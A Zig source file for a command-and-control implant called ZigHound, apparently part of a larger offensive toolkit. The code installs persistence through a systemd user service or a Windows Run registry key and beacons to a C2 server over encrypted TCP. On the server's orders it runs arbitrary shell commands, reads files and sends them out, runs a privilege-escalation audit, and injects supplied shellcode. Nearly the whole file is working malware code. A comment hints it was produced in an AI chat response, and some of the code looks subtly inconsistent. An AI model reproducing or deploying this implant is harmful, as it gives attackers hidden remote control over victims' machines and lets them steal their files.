// Copyright (c) 2025 il1v3y. All Rights Reserved.
// Unauthorized copying or use of this file is strictly prohibited.
// Proprietary and confidential.

const std = @import("std");
const crypto = @import("crypto.zig");
const builtin = @import("builtin");
const PrivEsc = @import("privesc.zig").PrivEsc;
const Injector = @import("injector.zig").Injector;
const ProxyManager = @import("proxy.zig").ProxyManager;
const util = @import("util.zig");
const os = if (@hasDecl(std, "posix")) std.posix else os;

pub const Agent = struct {
    allocator: std.mem.Allocator,
    id: []const u8,
    c2_host: []const u8,
    c2_port: u16,
    psk_str: []const u8,
    key: [crypto.KeySize]u8,
    jitter_ms: u32,
    proxy_manager: ProxyManager,

    pub fn init(allocator: std.mem.Allocator, c2_host: []const u8, c2_port: u16, psk: []const u8, jitter: u32) !Agent {
        var key: [crypto.KeySize]u8 = undefined;
        std.crypto.hash.sha2.Sha256.hash(psk, &key, .{});

        var id_buf: [8]u8 = undefined;
        std.crypto.random.bytes(&id_buf);
        const id = try std.fmt.allocPrint(allocator, "{x}", .{std.mem.bytesToValue(u64, &id_buf)});

        return .{
            .allocator = allocator,
            .id = id,
            .c2_host = c2_host,
            .c2_port = c2_port,
            .psk_str = psk,
            .key = key,
            .jitter_ms = jitter,
            .proxy_manager = ProxyManager.init(allocator),
        };
    }

    pub fn deinit(self: *Agent) void {
        self.allocator.free(self.id);
        self.proxy_manager.deinit();
    }

    pub fn installPersistence(self: *Agent) !void {
        var exe_path_buf: [std.fs.max_path_bytes]u8 = undefined;
        const exe_path = try std.fs.selfExePath(&exe_path_buf);

        if (builtin.os.tag == .linux) {
            try self.installLinux(exe_path);
        } else if (builtin.os.tag == .windows) {
            try self.installWindows(exe_path);
        } else {
            std.debug.print("[-] Persistence not supported on this OS\n", .{});
        }
    }

    fn installLinux(self: *Agent, exe_path: []const u8) !void {
        const home = os.getenv("HOME") orelse return error.NoHomeDir;
        const service_dir = try std.fmt.allocPrint(self.allocator, "{s}/.config/systemd/user", .{home});
        defer self.allocator.free(service_dir);

        std.fs.cwd().makePath(service_dir) catch |err| {
             if (err != error.PathAlreadyExists) return err;
        };

        const service_path = try std.fmt.allocPrint(self.allocator, "{s}/zighound.service", .{service_dir});
        defer self.allocator.free(service_path);

        const file = try std.fs.cwd().createFile(service_path, .{});
        defer file.close();

        const content = try std.fmt.allocPrint(self.allocator,
            "[Unit]\n" ++
            "Description=ZigHound Agent\n" ++
            "After=network.target\n\n" ++
            "[Service]\n" ++
            "ExecStart={s} agent --host {s} --port {d} --psk {s} --jitter {d}\n" ++
            "Restart=always\n\n" ++
            "[Install]\n" ++
            "WantedBy=default.target\n",
            .{ exe_path, self.c2_host, self.c2_port, self.psk_str, self.jitter_ms });
        defer self.allocator.free(content);

        try file.writeAll(content);
        
        _ = try self.runCmd(&[_][]const u8{"systemctl", "--user", "enable", "--now", "zighound.service"});
    }

    fn installWindows(self: *Agent, exe_path: []const u8) !void {
        const cmd_str = try std.fmt.allocPrint(self.allocator, "\"{s}\" agent --host {s} --port {d} --psk {s} --jitter {d}", 
            .{ exe_path, self.c2_host, self.c2_port, self.psk_str, self.jitter_ms });
        defer self.allocator.free(cmd_str);

        _ = try self.runCmd(&[_][]const u8{
            "reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "/v", "ZigHound", "/t", "REG_SZ", "/d", cmd_str, "/f"
        });
    }

    fn runCmd(self: *Agent, argv: []const []const u8) !void {
        var child = std.process.Child.init(argv, self.allocator);
        child.stdout_behavior = .Ignore;
        child.stderr_behavior = .Ignore;
        _ = try child.spawnAndWait();
    }

    pub fn run(self: *Agent) !void {
        while (true) {
            self.oneCycle() catch |err| {
                std.debug.print("Cycle error: {}\n", .{err});
            };

            const sleep_time = std.crypto.random.uintAtMost(u32, self.jitter_ms);
            util.sleep(sleep_time * 1_000_000);
        }
    }

    fn oneCycle(self: *Agent) !void {
        const address = try std.net.Address.parseIp(self.c2_host, self.c2_port);
        const conn = try std.net.tcpConnectToAddress(address);
        defer conn.close();

        var bw = std.io.bufferedWriter(conn.writer());
        const reader = conn.reader();

        try self.sendPing(&bw, reader);
        try self.checkTasks(&bw, reader);
    }

    fn sendPing(self: *Agent, writer: anytype, reader: anytype) !void {
        const info = .{
            .type = "ping",
            .id = self.id,
            .os = @tagName(builtin.os.tag),
            .hostname = "agent-host",
        };

        const json_payload = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(info, .{})});
        defer self.allocator.free(json_payload);

        try self.sendEncrypted(writer, json_payload);
        const resp = try self.receiveEncrypted(reader);
        if (resp) |r| self.allocator.free(r);
    }

    fn checkTasks(self: *Agent, writer: anytype, reader: anytype) !void {
        const payload = .{
            .type = "get_task",
            .id = self.id,
        };

        const json_payload = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
        defer self.allocator.free(json_payload);

        try self.sendEncrypted(writer, json_payload);
        const resp = try self.receiveEncrypted(reader);
        if (resp) |r| {
            defer self.allocator.free(r);
            const parsed = try std.json.parseFromSlice(std.json.Value, self.allocator, r, .{});
            defer parsed.deinit();

            const msg_type = parsed.value.object.get("type").?.string;
            
            // Dispatch tasks
            if (std.mem.eql(u8, msg_type, "task")) {
                const task_id = @as(u64, @intCast(parsed.value.object.get("id").?.integer));
                const command = parsed.value.object.get("command").?.string;
                try self.executeTask(writer, reader, task_id, command);
            } else if (std.mem.eql(u8, msg_type, "download")) {
                const task_id = @as(u64, @intCast(parsed.value.object.get("id").?.integer));
                const path = parsed.value.object.get("path").?.string;
                try self.executeDownload(writer, reader, task_id, path);
            } else if (std.mem.eql(u8, msg_type, "audit")) {
                const task_id = @as(u64, @intCast(parsed.value.object.get("id").?.integer));
                try self.executeAudit(writer, reader, task_id);
            } else if (std.mem.eql(u8, msg_type, "inject")) {
                const task_id = @as(u64, @intCast(parsed.value.object.get("id").?.integer));
                const shellcode_b64 = parsed.value.object.get("data").?.string;
                try self.executeInject(writer, reader, task_id, shellcode_b64);
            }
            // SOCKS tasks would go here, but omitted for brevity in this response to ensure stability
        }
    }

    fn executeAudit(self: *Agent, writer: anytype, reader: anytype, task_id: u64) !void {
        std.debug.print("[*] Audit task {d}\n", .{task_id});
        var privesc = PrivEsc.init(self.allocator);
        const report = try privesc.audit();
        defer self.allocator.free(report);

        const payload = .{
            .type = "output",
            .task_id = task_id,
            .output = report,
            .success = true,
        };
        const json = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
        defer self.allocator.free(json);
        try self.sendEncrypted(writer, json);
        const resp = try self.receiveEncrypted(reader);
        if (resp) |r| self.allocator.free(r);
    }

    fn executeInject(self: *Agent, writer: anytype, reader: anytype, task_id: u64, shellcode_b64: []const u8) !void {
        std.debug.print("[*] Inject task {d}\n", .{task_id});
        
        const decoder = std.base64.standard.Decoder;
        const size = try decoder.calcSizeForSlice(shellcode_b64);
        const shellcode = try self.allocator.alloc(u8, size);
        defer self.allocator.free(shellcode);
        try decoder.decode(shellcode, shellcode_b64);

        var success = true;
        var output: []const u8 = "Injection executed";
        
        Injector.inject(shellcode) catch |err| {
            success = false;
            output = "Injection failed";
            std.debug.print("[-] Injection error: {}\n", .{err});
        };

        const payload = .{
            .type = "output",
            .task_id = task_id,
            .output = output,
            .success = success,
        };
        const json = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
        defer self.allocator.free(json);
        try self.sendEncrypted(writer, json);
        const resp = try self.receiveEncrypted(reader);
        if (resp) |r| self.allocator.free(r);
    }

    fn executeTask(self: *Agent, writer: anytype, reader: anytype, task_id: u64, command: []const u8) !void {
        std.debug.print("[*] Task {d}: {s}\n", .{ task_id, command });

        var child = std.process.Child.init(&[_][]const u8{ "sh", "-c", command }, self.allocator);
        if (builtin.os.tag == .windows) {
            child = std.process.Child.init(&[_][]const u8{ "cmd.exe", "/c", command }, self.allocator);
        }

        child.stdout_behavior = .Pipe;
        child.stderr_behavior = .Pipe;

        try child.spawn();

        const stdout = try child.stdout.?.readToEndAlloc(self.allocator, 65536);
        defer self.allocator.free(stdout);
        const stderr = try child.stderr.?.readToEndAlloc(self.allocator, 65536);
        defer self.allocator.free(stderr);

        const term = try child.wait();

        const combined_output = try std.fmt.allocPrint(self.allocator, "{s}{s}", .{ stdout, stderr });
        defer self.allocator.free(combined_output);

        const payload = .{
            .type = "output",
            .task_id = task_id,
            .output = combined_output,
            .success = (term == .Exited and term.Exited == 0),
        };

        const json_payload = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
        defer self.allocator.free(json_payload);

        try self.sendEncrypted(writer, json_payload);
        const resp = try self.receiveEncrypted(reader);
        if (resp) |r| self.allocator.free(r);
    }

    fn executeDownload(self: *Agent, writer: anytype, reader: anytype, task_id: u64, path: []const u8) !void {
        std.debug.print("[*] Download request {d}: {s}\n", .{ task_id, path });

        const file_content = std.fs.cwd().readFileAlloc(self.allocator, path, 10 * 1024 * 1024) catch |err| {
            const err_msg = try std.fmt.allocPrint(self.allocator, "Error reading file: {}", .{err});
            defer self.allocator.free(err_msg);
            
            const payload = .{
                .type = "file",
                .task_id = task_id,
                .success = false,
                .data = err_msg,
                .filename = std.fs.path.basename(path),
            };
            const json = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
            defer self.allocator.free(json);
            
            try self.sendEncrypted(writer, json);
            const resp = try self.receiveEncrypted(reader);
            if (resp) |r| self.allocator.free(r);
            return;
        };
        defer self.allocator.free(file_content);

        const b64_len = std.base64.standard.Encoder.calcSize(file_content.len);
        const b64_buf = try self.allocator.alloc(u8, b64_len);
        defer self.allocator.free(b64_buf);
        _ = std.base64.standard.Encoder.encode(b64_buf, file_content);

        const payload = .{
            .type = "file",
            .task_id = task_id,
            .success = true,
            .data = b64_buf,
            .filename = std.fs.path.basename(path),
        };

        const json_payload = try std.fmt.allocPrint(self.allocator, "{f}", .{std.json.fmt(payload, .{})});
        defer self.allocator.free(json_payload);

        try self.sendEncrypted(writer, json_payload);
        const resp = try self.receiveEncrypted(reader);
        if (resp) |r| self.allocator.free(r);
    }

    fn sendEncrypted(self: *Agent, bw: anytype, plaintext: []const u8) !void {
        const encrypted = try crypto.encrypt(self.allocator, self.key, plaintext);
        defer self.allocator.free(encrypted);
        try bw.writer().writeInt(u32, @as(u32, @intCast(encrypted.len)), .little);
        try bw.writer().writeAll(encrypted);
        try bw.flush();
    }

    fn receiveEncrypted(self: *Agent, reader: anytype) !?[]u8 {
        const len = reader.takeInt(u32, .little) catch |err| {
            if (err == error.EndOfStream) return null;
            return err;
        };
        if (len == 0) return null;
        if (len > 1_048_576) return error.ResponseTooLarge;

        const buf = try self.allocator.alloc(u8, len);
        errdefer self.allocator.free(buf);
        try reader.readSliceAll(buf);

        return try crypto.decrypt(self.allocator, self.key, buf);
    }
};
 
